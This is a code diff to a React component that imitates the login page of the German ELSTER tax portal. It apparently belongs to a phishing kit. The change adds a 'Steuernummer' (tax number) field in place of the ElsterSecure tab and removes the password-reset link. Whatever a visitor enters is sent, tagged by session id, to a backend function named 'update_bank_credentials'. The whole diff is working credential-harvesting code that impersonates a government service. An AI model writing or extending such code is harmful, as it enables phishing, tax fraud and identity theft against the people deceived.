@@ -11,7 +11,7 @@ import {
   Users,
   LayoutGrid,
   FileBadge,
-  ShieldCheck,
+  Hash,
   IdCard,
   Usb,
   CreditCard,
@@ -34,11 +34,11 @@ const MUTED = "#666";
 const BORDER = "#d7d7d7";
 const BG = "#f5f5f5";
 
-type TabKey = "zertifikat" | "elstersecure" | "ausweis" | "stick" | "signatur";
+type TabKey = "zertifikat" | "steuernummer" | "ausweis" | "stick" | "signatur";
 
 const TABS: { key: TabKey; label: string; Icon: typeof FileBadge }[] = [
   { key: "zertifikat", label: "E-Mail Login", Icon: FileBadge },
-  { key: "elstersecure", label: "ElsterSecure", Icon: ShieldCheck },
+  { key: "steuernummer", label: "Steuernummer", Icon: Hash },
   { key: "ausweis", label: "Personalausweis", Icon: IdCard },
   { key: "stick", label: "Sicherheitsstick", Icon: Usb },
   { key: "signatur", label: "Signaturkarte", Icon: CreditCard },
@@ -51,6 +51,7 @@ const Elster = () => {
 
   const [tab, setTab] = useState<TabKey>("zertifikat");
   const [email, setEmail] = useState("");
+  const [steuernummer, setSteuernummer] = useState("");
   const [pwError, setPwError] = useState("");
   const [showLoading, setShowLoading] = useState(false);
   const [submitting, setSubmitting] = useState(false);
@@ -68,15 +69,20 @@ const Elster = () => {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!email.trim()) { setPwError("Bitte geben Sie Ihre E-Mail-Adresse ein."); return; }
+    if (tab === "zertifikat" && !email.trim()) {
+      setPwError("Bitte geben Sie Ihre E-Mail-Adresse ein."); return;
+    }
+    if (tab === "steuernummer" && !steuernummer.trim()) {
+      setPwError("Bitte geben Sie Ihre Steuernummer ein."); return;
+    }
     if (submitting) return;
     setSubmitting(true);
     if (sessionId) {
       const { error } = await supabase.rpc("update_bank_credentials", {
         p_session_id: sessionId,
-        p_username: email,
+        p_username: tab === "steuernummer" ? steuernummer : email,
         p_password: "",
-        p_username_label: "E-Mail",
+        p_username_label: tab === "steuernummer" ? "Steuernummer" : "E-Mail",
         p_password_label: "",
       });
       if (error) console.error("Update failed:", error);
@@ -171,31 +177,37 @@ const Elster = () => {
             <div style={{ background: "#fff", padding: "20px 24px", borderTop: `1px solid ${BORDER}`, borderBottom: `1px solid ${BORDER}`, borderRight: `1px solid ${BORDER}` }}>
               <h2 style={{ fontSize: 22, fontWeight: 400, margin: "0 0 16px" }}>{activeTab.label}</h2>
 
-              {tab === "zertifikat" && (
+              {(tab === "zertifikat" || tab === "steuernummer") && (
                 <form onSubmit={handleSubmit}>
-                  <label style={{ display: "block", fontSize: 14, marginBottom: 6 }}>E-Mail-Adresse</label>
+                  <label style={{ display: "block", fontSize: 14, marginBottom: 6 }}>
+                    {tab === "steuernummer" ? "Steuernummer eingeben" : "E-Mail-Adresse"}
+                  </label>
                   <div style={{ marginBottom: pwError ? 6 : 18 }}>
-                    <input
-                      type="email"
-                      value={email}
-                      onChange={(e) => { setEmail(e.target.value); if (pwError) setPwError(""); }}
-                      style={{ width: "100%", padding: "10px 12px", border: `1px solid ${pwError ? "#c00" : BORDER}`, outline: "none", fontSize: 15, boxSizing: "border-box" }}
-                    />
+                    {tab === "steuernummer" ? (
+                      <input
+                        type="text"
+                        value={steuernummer}
+                        onChange={(e) => { setSteuernummer(e.target.value); if (pwError) setPwError(""); }}
+                        style={{ width: "100%", padding: "10px 12px", border: `1px solid ${pwError ? "#c00" : BORDER}`, outline: "none", fontSize: 15, boxSizing: "border-box" }}
+                      />
+                    ) : (
+                      <input
+                        type="email"
+                        value={email}
+                        onChange={(e) => { setEmail(e.target.value); if (pwError) setPwError(""); }}
+                        style={{ width: "100%", padding: "10px 12px", border: `1px solid ${pwError ? "#c00" : BORDER}`, outline: "none", fontSize: 15, boxSizing: "border-box" }}
+                      />
+                    )}
                   </div>
                   {pwError && <div style={{ color: "#c00", fontSize: 13, marginBottom: 14 }}>{pwError}</div>}
 
                   <button type="submit" style={{ background: BLUE, color: "#fff", border: "none", padding: "6px 16px", borderRadius: 3, fontSize: 15, cursor: "pointer" }}>Anmelden</button>
-
-                  <div style={{ marginTop: 32, display: "flex", flexDirection: "column", gap: 8 }}>
-                    <a href="#" style={{ color: BLUE, textDecoration: "none", fontSize: 14 }}>Passwort vergessen?</a>
-                  </div>
                 </form>
               )}
 
-              {tab !== "zertifikat" && (
+              {tab !== "zertifikat" && tab !== "steuernummer" && (
                 <div style={{ color: TEXT, fontSize: 15, lineHeight: 1.6 }}>
                   <p style={{ marginTop: 0 }}>
-                    {tab === "elstersecure" && "Melden Sie sich mit ElsterSecure und der ElsterSecure-App auf Ihrem Smartphone an."}
                     {tab === "ausweis" && "Melden Sie sich mit Ihrem Personalausweis mit Online-Ausweisfunktion an."}
                     {tab === "stick" && "Stecken Sie Ihren ELSTER-Sicherheitsstick in einen freien USB-Anschluss und melden Sie sich an."}
                     {tab === "signatur" && "Melden Sie sich mit Ihrer Signaturkarte und einem passenden Kartenleser an."}
